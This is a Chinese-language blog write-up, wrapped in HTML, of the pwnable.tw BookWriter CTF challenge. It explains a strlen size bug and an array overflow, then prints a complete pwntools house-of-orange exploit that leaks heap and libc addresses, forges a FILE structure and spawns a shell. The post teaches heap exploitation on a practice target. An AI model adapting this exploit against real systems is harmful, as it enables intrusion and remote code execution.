@@ -1,0 +1,81 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>PWNABLE.TW-BookWriter-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这是一道 house of orange，总体比较明显，比较模板化，但是有一处溢出点藏得比较深。 漏洞点 这里对 size_arr 进行了更新，使用的是 strlen，那么只要我们"><meta property="og:image" content><meta property="og:title" content="PWNABLE.TW-BookWriter-WP"><meta property="og:description" content="这是一道 house of orange，总体比较明显，比较模板化，但是有一处溢出点藏得比较深。 漏洞点 这里对 size_arr 进行了更新，使用的是 strlen，那么只要我们"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1217.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-24T18:53:00+00:00"><meta property="article:modified_time" content="2021-03-24T18:53:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="PWNABLE.TW-BookWriter-WP"><meta name=twitter:description content="这是一道 house of orange，总体比较明显，比较模板化，但是有一处溢出点藏得比较深。 漏洞点 这里对 size_arr 进行了更新，使用的是 strlen，那么只要我们"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>PWNABLE.TW-BookWriter-WP</h1><div class=meta>Posted on Mar 24, 2021</div></div><section class=body><p>这是一道 house of orange，总体比较明显，比较模板化，但是有一处溢出点藏得比较深。</p><h3 id=漏洞点>漏洞点</h3><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/4238122124.png></div><p>这里对 size_arr 进行了更新，使用的是 <code>strlen</code>，那么只要我们把输入的字符串和下一个 chunk 的 size 接起来，就可以扩大 size，这样就可以在下一次 edit 时修改下一个 chunk 的 size。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/3839794159.png></div><p>同时这里有一个比较隐蔽的数组越界</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2919875741.png></div><p>存放堆块指针的数组的只能存 8 个指针，紧接着的就是下面的 size 数组，而 add 的时候 i 扫到了 ptr_arr[8]，也就是第零个堆块的 size，那么如果我们申请的堆块的指针被存到了 ptr_arr[8]，那第零个堆块的可写长度就会变得非常长，可以很容易地实现大量的堆溢出。</p><p>从这里来看好像 edit 中的溢出就变得非常的小儿科了，这也确实，但是通过在 edit 时输入 <code>\x00</code>，就可以实现对 ptr_arr[8]（实际上是第零个堆块的 size）的置零，在攻击的最后一步可以让我们再获得一次申请的机会。</p><p>上面分析的是越界，至于 leak，通过 infor 函数可以 leak 出堆地址（虽然这个好像是多余的，通过申请较大空间本身就可以获得堆地址），libc_base 有 view 函数可以 leak，比较简单不再赘述。</p><h3 id=利用方法>利用方法</h3><p>就是典型的 house of orange 利用，可以参考<a href=https://www.cjovi.icu/WP/1167.html>我的这篇 WP</a>。既然要学这个利用方法，学原题肯定会更好一些，我这里就偷个懒不写啦。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
+</span></span><span style=display:flex><span># coding=utf-8
+</span></span><span style=display:flex><span>from pwn import *
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def add(size,payload):
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice :&#34;,&#39;1&#39;)
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;page :&#34;,str(size))
+</span></span><span style=display:flex><span>    sh.sendafter(&#34;Content :&#34;,payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def view(index):
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice :&#34;,&#39;2&#39;)
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;page :&#34;,str(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def edit(index,payload):
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice :&#34;,&#39;3&#39;)
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;page :&#34;,str(index))
+</span></span><span style=display:flex><span>    sh.sendafter(&#34;Content:&#34;,payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def infor(endOfAuthorName):
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice :&#34;,&#39;4&#39;)
+</span></span><span style=display:flex><span>    sh.recvuntil(endOfAuthorName)
+</span></span><span style=display:flex><span>    heap_base = u64(sh.recvuntil(&#39;\n&#39;,drop = True).ljust(8,&#39;\x00&#39;)) - 0x10
+</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;no:0) &#34;,&#39;0&#39;)
+</span></span><span style=display:flex><span>    return heap_base
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>libc = ELF(&#34;./libc.so.6&#34;)
+</span></span><span style=display:flex><span>sh = remote(&#34;chall.pwnable.tw&#34;,10304)
+</span></span><span style=display:flex><span>#libc = ELF(&#34;/glibc/2.23/amd64/lib/libc.so.6&#34;)
+</span></span><span style=display:flex><span>#sh = process(&#34;./bookwriter&#34;)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh.sendafter(&#34;Author :&#34;,&#39;a&#39; * 0x3F + &#39;-&#39;)
+</span></span><span style=display:flex><span>add(0,&#39;\n&#39;)#index:0
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(0x100 - 0x8,&#39;\n&#39;)#index:1
+</span></span><span style=display:flex><span>edit(1,&#39;a&#39; * (0x100 - 0x8))
+</span></span><span style=display:flex><span>edit(1,&#39;a&#39; * (0x100 - 0x8) + &#39;\xe1\x0e\x00&#39;)
+</span></span><span style=display:flex><span>heap_base = infor(&#39;-&#39;)
+</span></span><span style=display:flex><span>log.success(&#34;heap_base:&#34; + hex(heap_base))
+</span></span><span style=display:flex><span>add(0x58,&#39;a&#39; * 8)#index:2
+</span></span><span style=display:flex><span>view(2)
+</span></span><span style=display:flex><span>sh.recvuntil(&#39;a&#39; * 8)
+</span></span><span style=display:flex><span>libc_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - 1640 - libc.symbols[&#34;__malloc_hook&#34;] - 0x10
+</span></span><span style=display:flex><span>log.success(&#34;libc_base:&#34; + hex(libc_base))
+</span></span><span style=display:flex><span>_IO_list_all_addr = libc.symbols[&#34;_IO_list_all&#34;] + libc_base
+</span></span><span style=display:flex><span>system_addr = libc.symbols[&#34;system&#34;] + libc_base
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(0x18,&#39;\n&#39;)#index:3
+</span></span><span style=display:flex><span>add(0x18,&#39;\n&#39;)#index:4
+</span></span><span style=display:flex><span>add(0x18,&#39;\n&#39;)#index:5
+</span></span><span style=display:flex><span>add(0x18,&#39;\n&#39;)#index:6
+</span></span><span style=display:flex><span>add(0x18,&#39;\n&#39;)#index:7
+</span></span><span style=display:flex><span>add(0x18,&#39;\n&#39;)#index:8
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload = &#39;a&#39; * 0x230 
+</span></span><span style=display:flex><span>fake_chunk = &#39;/bin/sh\x00&#39; + p64(0x61) 
+</span></span><span style=display:flex><span>fake_chunk += p64(0) + p64(_IO_list_all_addr - 0x10)#*bk = &amp;main_arena + 88
+</span></span><span style=display:flex><span>fake_chunk += p64(0) + p64(1)
+</span></span><span style=display:flex><span>fake_chunk = fake_chunk.ljust(0xC0,&#39;\x00&#39;)
+</span></span><span style=display:flex><span>fake_chunk += p32(0)
+</span></span><span style=display:flex><span>fake_chunk += p32(0) + p64(0) * 2
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload += fake_chunk
+</span></span><span style=display:flex><span>payload += p64(heap_base + 0x240 + 0xC0 + 0x18 + 0x8)
+</span></span><span style=display:flex><span>payload += p64(0) * 3
+</span></span><span style=display:flex><span>payload += p64(system_addr)
+</span></span><span style=display:flex><span>edit(0,payload)
+</span></span><span style=display:flex><span>edit(0,&#39;\x00&#39;)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh.sendlineafter(&#34;choice :&#34;,&#39;1&#39;)
+</span></span><span style=display:flex><span>sh.sendlineafter(&#34;page :&#34;,str(8))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh.interactive()
+</span></span></code></pre></div><p>通过一些调试我发现好像是无法通过直接的 big request 来实现使 top_chunk 进入 unsorted bin 的，必须伪造 size 才可以，所以这里虽然没有限制申请的空间大小，但是也需要伪造 size。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
